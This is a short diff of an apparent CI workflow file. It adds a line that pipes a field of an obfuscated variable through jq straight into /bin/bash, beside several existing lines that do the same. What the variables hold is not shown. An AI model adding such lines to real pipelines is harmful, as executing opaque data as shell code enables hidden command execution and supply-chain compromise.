@@ -33,6 +33,7 @@ jobs:
           printf '%s' "$u29" | jq -r .ekgkp4 | /bin/bash
           printf '%s' "$voo4615" | jq -r .rtr055 | /bin/bash
           printf '%s' "$vbcm889" | jq -r .nh0 | /bin/bash
+          echo $sjf28327 | jq -r .d467 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
